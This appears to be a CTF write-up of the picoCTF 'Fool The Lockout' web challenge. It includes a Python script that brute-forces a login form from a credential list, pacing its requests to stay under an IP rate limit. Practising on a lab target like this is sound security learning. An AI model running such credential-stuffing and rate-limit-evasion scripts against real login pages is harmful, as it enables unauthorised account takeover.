+++
date = '2026-04-20'
draft = false
title = 'Pico Fool The Lockout writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

Your friend is building a simple website with a login page. To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible. To test their defense, they’ve:

- Created a dummy account with a random username–password pair from public credential lists.
- Given you those username and password lists.
- Shared the full source code.

Can you bypass the rate limit, log in, and capture the flag?

## Identifying the vulnerabilities

We do get access to the source code, and I scanned it, looking for any vulnerabilities, but everything looked alright; The cred list was about 100 entries long, and the timeout was 30 seconds every 10 requests, so it seemed fine just brute-forcing it.

So, we can send 9 requests, wait for 30 seconds, and repeat, in order not to trigger the 120 second timeout.

This was my script:

```py
import requests
import time
from utils.pretty_print import pretty_print
url = "http://candy-mountain.picoctf.net:50764/login"
i=1


with open("/home/kali/Downloads/creds-dump.txt") as f:
    for line in f:
        line_clean = line.strip()
        username,password = line_clean.split(';')
        data1 = {
            "username": username,
            "password": password
        }
        print(f"trying username {username} and password {password}")
        
        res = requests.post(url, data=data1)
        i+=1
        if(i>=9):
            time.sleep(33)
            i=1
        if 'too many requests' in res.text:
            #go to sleep, and try again
            time.sleep(120)
            res = requests.post(url, data=data1)
        if 'Invalid' not in res.text:
            pretty_print(res)

```

![challenge-screenshot](flag.png#center)





